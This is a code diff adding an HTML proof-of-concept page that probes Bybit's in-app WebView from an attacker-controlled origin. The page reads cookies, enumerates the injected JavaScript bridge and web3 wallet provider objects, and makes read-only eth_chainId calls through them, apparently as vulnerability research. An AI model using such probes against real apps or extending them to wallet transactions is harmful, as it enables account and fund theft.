@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bybit WebView Delivery PoC</title>
+<style>
+ body{font-family:-apple-system,Roboto,monospace;background:#0b0e11;color:#f7a600;margin:0;padding:14px;font-size:13px}
+ h1{font-size:16px;color:#fff}
+ pre{white-space:pre-wrap;word-break:break-all;background:#161a1e;color:#5ee6a8;padding:10px;border-radius:6px;font-size:12px}
+ .bad{color:#ff5b5b}.ok{color:#5ee6a8}.warn{color:#f7a600}
+ button{background:#f7a600;color:#000;border:0;padding:10px 14px;border-radius:6px;margin:4px 0;font-weight:bold}
+</style>
+</head>
+<body>
+<h1>Bybit in-app WebView — attacker-origin delivery probe</h1>
+<div id="loaded">PAGE LOADED on attacker origin. If you can read this inside Bybit, the whitelist did NOT block it.</div>
+<pre id="out">collecting...</pre>
+<button onclick="probeWeb3()">probe window.ethereum / handlerWeb3Request</button>
+<button onclick="probeBridge()">re-enumerate bridge</button>
+<pre id="web3out"></pre>
+<script>
+function J(o){try{return JSON.stringify(o,Object.getOwnPropertyNames(o));}catch(e){return String(o);}}
+function collect(){
+ var L=[];
+ L.push("href="+location.href);
+ L.push("origin="+location.origin);
+ try{L.push("document.domain="+document.domain);}catch(e){L.push("document.domain ERR:"+e);}
+ // cookie read = setCookieForMain UC-class check
+ try{L.push("document.cookie=["+document.cookie+"]");}catch(e){L.push("cookie ERR:"+e);}
+ // enumerate bridge globals
+ var keys=["_b_bridge_","_b_bridge_callback_","flutter_inappwebview","ethereum","bybitWallet","unisat","tronLink","webkit"];
+ keys.forEach(function(k){
+   var has = (k in window) && window[k]!=null;
+   L.push((has?"[PRESENT] ":"[absent]  ")+"window."+k);
+ });
+ // flutter_inappwebview handlers
+ try{
+   if(window.flutter_inappwebview){
+     L.push("flutter_inappwebview keys: "+Object.keys(window.flutter_inappwebview).join(","));
+     if(window.flutter_inappwebview._callHandler||window.flutter_inappwebview.callHandler)
+       L.push("[PRESENT] flutter_inappwebview.callHandler -> handlerWeb3Request reachable?");
+   }
+ }catch(e){L.push("fiw ERR:"+e);}
+ // _b_bridge_ shape
+ try{
+   if(window._b_bridge_){
+     L.push("_b_bridge_ type="+typeof window._b_bridge_);
+     L.push("_b_bridge_ keys: "+Object.keys(window._b_bridge_).join(","));
+   }
+ }catch(e){L.push("_b_bridge_ ERR:"+e);}
+ // window.ethereum shape (web3 provider injection)
+ try{
+   if(window.ethereum){
+     L.push("ethereum.isMetaMask="+window.ethereum.isMetaMask+" isBybit="+window.ethereum.isBybit);
+     L.push("ethereum keys: "+Object.keys(window.ethereum).join(","));
+   }
+ }catch(e){L.push("eth ERR:"+e);}
+ document.getElementById('out').textContent=L.join("\n");
+}
+function probeBridge(){collect();}
+function probeWeb3(){
+ var L=[];
+ // Attempt eth_chainId (read-only, no funds) to prove provider is live + reachable from attacker origin
+ try{
+   if(window.ethereum && window.ethereum.request){
+     window.ethereum.request({method:"eth_chainId"}).then(function(r){
+       document.getElementById('web3out').textContent="eth_chainId RESPONSE (provider LIVE on attacker origin): "+J(r);
+     }).catch(function(e){
+       document.getElementById('web3out').textContent="eth_chainId rejected: "+J(e);
+     });
+     L.push("called ethereum.request eth_chainId (read-only)");
+   } else { L.push("no window.ethereum.request"); }
+ }catch(e){L.push("web3 ERR:"+e);}
+ // Attempt raw bridge callHandler for handlerWeb3Request, read-only method
+ try{
+   if(window.flutter_inappwebview && window.flutter_inappwebview.callHandler){
+     window.flutter_inappwebview.callHandler('handlerWeb3Request', JSON.stringify({method:'eth_chainId',params:[]}))
+      .then(function(r){L.push("callHandler handlerWeb3Request resp: "+J(r));document.getElementById('web3out').textContent+="\n"+L.join("\n");})
+      .catch(function(e){L.push("callHandler err: "+J(e));document.getElementById('web3out').textContent+="\n"+L.join("\n");});
+   }
+ }catch(e){L.push("callHandler ERR:"+e);}
+ document.getElementById('web3out').textContent=L.join("\n");
+}
+collect();
+// auto-probe after providers inject
+setTimeout(collect,1500);
+setTimeout(collect,3500);
+</script>
+</body>
+</html>
